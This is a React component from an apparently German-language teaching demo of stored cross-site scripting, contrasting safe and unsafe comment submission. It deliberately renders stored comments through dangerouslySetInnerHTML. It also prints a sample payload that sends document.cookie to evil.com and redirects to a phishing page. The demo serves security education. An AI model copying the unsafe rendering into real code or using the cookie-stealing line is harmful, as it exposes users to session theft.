import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { XSS_PAYLOAD, StoredComment, StoredOutput } from "./XssCodeTrace"

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

type Phase = "attacker" | "user" | "done"

// ---------------------------------------------------------------------------
// StoredXss
// ---------------------------------------------------------------------------

export function StoredXss({ onOutput }: { onOutput: (o: StoredOutput) => void }) {
  const [input, setInput] = useState("")
  const [phase, setPhase] = useState<Phase>("attacker")
  const [attackerSafe, setAttackerSafe] = useState<boolean | null>(null)
  const [attackerComment, setAttackerComment] = useState("")
  const [userResult, setUserResult] = useState<{ safe: boolean; entries: StoredComment[] } | null>(null)
  const [xssTriggered, setXssTriggered] = useState(false)

  useEffect(() => {
    const handler = () => setXssTriggered(true)
    document.addEventListener("xss-triggered", handler)
    return () => document.removeEventListener("xss-triggered", handler)
  }, [])

  async function handleAttackerSubmit(safe: boolean) {
    setXssTriggered(false)
    const endpoint = safe ? "/api/xss/comments-safe" : "/api/xss/comments-unsafe"
    await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(input),
    })
    const submitted = input
    setAttackerComment(submitted)
    setAttackerSafe(safe)
    setInput("")
    setPhase("user")
    onOutput({ attackerSafe: safe, attackerComment: submitted })
  }

  async function handleUserSubmit(safe: boolean) {
    const endpoint = safe ? "/api/xss/comments-safe" : "/api/xss/comments-unsafe"
    await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(input),
    })
    const res = await fetch("/api/xss/comments")
    const entries: StoredComment[] = res.ok ? await res.json() : []
    setUserResult({ safe, entries })
    setPhase("done")
    onOutput({ attackerSafe: attackerSafe!, attackerComment, userSafe: safe, userEntries: entries })
  }

  async function reset() {
    await fetch("/api/xss/comments", { method: "DELETE" })
    setPhase("attacker")
    setInput("")
    setAttackerSafe(null)
    setAttackerComment("")
    setUserResult(null)
    setXssTriggered(false)
  }

  return (
    <div className="flex flex-col gap-4 text-sm">

      {/* ─── Schritt 1: Angreifer ──────────────────────────────────────── */}
      <div className="flex flex-col gap-3">
        <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">
          Schritt 1 – Angreifer
        </p>
        <p className="text-sm text-muted-foreground">
          Ein Angreifer legt auf{" "}
          <span className="font-medium">www.seite.at </span> einen Account an
          und trägt im Kommentarfeld einen Schadcode ein.
        </p>

        {phase === "attacker" ? (
          <>
            <div className="flex flex-col gap-1.5">
              <div className="flex items-center justify-between">
                <Label htmlFor="stored-input-attacker">Kommentar posten:</Label>
                <button
                  type="button"
                  onClick={() => setInput(XSS_PAYLOAD)}
                  className="text-xs text-destructive underline underline-offset-2 hover:opacity-80"
                >
                  Malicious Payload
                </button>
              </div>
              <Input id="stored-input-attacker" value={input} readOnly />
            </div>
            <div className="flex gap-2">
              <Button type="button" className="flex-1" onClick={() => handleAttackerSubmit(true)}>
                Sicherer Submit-Button
              </Button>
              <Button
                type="button"
                variant="destructive"
                className="flex-1"
                onClick={() => handleAttackerSubmit(false)}
              >
                Unsicherer Submit-Button
              </Button>
            </div>
          </>
        ) : (
          <div className="rounded-md border bg-muted p-2 text-xs flex flex-col gap-1">
            <p className="text-muted-foreground">
              Submitted via {attackerSafe ? "Sicherer" : "Unsicherer"} Submit-Button:
            </p>
            <code className="break-all">{attackerComment}</code>
            <p className={attackerSafe ? "text-green-600" : "text-destructive"}>
              {attackerSafe
                ? "✓ Kein Schadcode kann übergeben werden"
                : "⚠ Der Schadcode wurde unverändert übernommen"}
            </p>
          </div>
        )}
      </div>

      {/* ─── Schritt 2: Legitimer User ─────────────────────────────────── */}
      {phase !== "attacker" && (
        <div className="flex flex-col gap-3 border-t pt-4">
          <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">
            Schritt 2 – Legitimer User
          </p>
          {phase === "user" && (
            <>
              <div className="flex flex-col gap-1.5">
                <div className="flex items-center justify-between">
                  <Label htmlFor="stored-input-user">Kommentar suchen:</Label>
                  <button
                    type="button"
                    onClick={() => setInput("Gib mir alle Post aus.")}
                    className="text-xs text-muted-foreground underline underline-offset-2 hover:text-foreground"
                  >
                    Normaler User Payload
                  </button>
                </div>
                <Input id="stored-input-user" value={input} readOnly />
              </div>
              <div className="flex gap-2">
                {attackerSafe ? (
                  <Button type="button" className="flex-1" onClick={() => handleUserSubmit(true)}>
                    Sicherer Submit-Button
                  </Button>
                ) : (
                  <Button
                    type="button"
                    variant="destructive"
                    className="flex-1"
                    onClick={() => handleUserSubmit(false)}
                  >
                    Unsicherer Submit-Button
                  </Button>
                )}
              </div>
            </>
          )}

          {phase === "done" && userResult && (
            <div className="flex flex-col gap-2">
              {/* XSS-Warnung nur zeigen, wenn Angreifer unsicher gespeichert hat UND User unsicher rendert */}
              {xssTriggered && !attackerSafe && !userResult.safe && (
                <div className="rounded-md bg-destructive/10 border border-destructive px-3 py-2 text-xs text-destructive flex flex-col gap-2">
                  <p className="font-semibold">⚠ XSS erfolgreich! Schadcodesimulation:</p>
                  <pre className="whitespace-pre-wrap font-mono">
                    {`// Session-Cookie stehlen und an Angreifer-Server senden\nfetch('https://evil.com/steal?c=' + document.cookie)\n// oder: Nutzer auf Phishing-Seite weiterleiten\ndocument.location = 'https://phishing-seite.at'\n// oder: Keylogger installieren, formular-daten abfangen, ...`}
                  </pre>
                </div>
              )}

              {userResult.safe ? (
                <p className="text-xs text-green-600">✓ Kein Schadcode wird ausgeführt</p>
              ) : attackerSafe ? (
                /* Schritt 1 war sicher → kein Schadcode in der DB, aber unsicherer Render-Pfad bleibt ein Risiko */
                <p className="text-xs text-amber-600">
                  ⚠ Hier passiert noch nichts – es wurde kein Schadcode hinterlegt. Solange jedoch
                  Schadcode über einen unsicheren Endpunkt eingeschleust werden kann, hat das System
                  ein Sicherheitsrisiko.
                </p>
              ) : (
                /* Schritt 1 unsicher + Schritt 2 unsicher → tatsächliche XSS-Ausführung */
                <p className="text-xs text-muted-foreground">
                  Ein anderer User besucht ebenfalls <span className="font-medium">www.seite.at</span> und
                  möchte sich über das Suchfeld alle Posts ausgeben lassen. Er klickt auf Submit (manchmal reicht es auch schon, die Seite
                  einfach nur zu besuchen) und löst den Schadcode aus.
                </p>
              )}

              {/* ⚠️ UNSICHER: Gespeicherte Einträge als HTML rendern – nur wenn Angreifer unsicher gespeichert hat */}
              {!userResult.safe && !attackerSafe &&
                userResult.entries.map((e) => (
                  <div
                    key={e.id}
                    className="hidden"
                    dangerouslySetInnerHTML={{ __html: e.content }}
                  />
                ))}
            </div>
          )}
        </div>
      )}

      <button
        type="button"
        onClick={reset}
        className="text-xs text-muted-foreground underline underline-offset-2 hover:text-foreground self-end"
      >
        DB zurücksetzen
      </button>
    </div>
  )
}

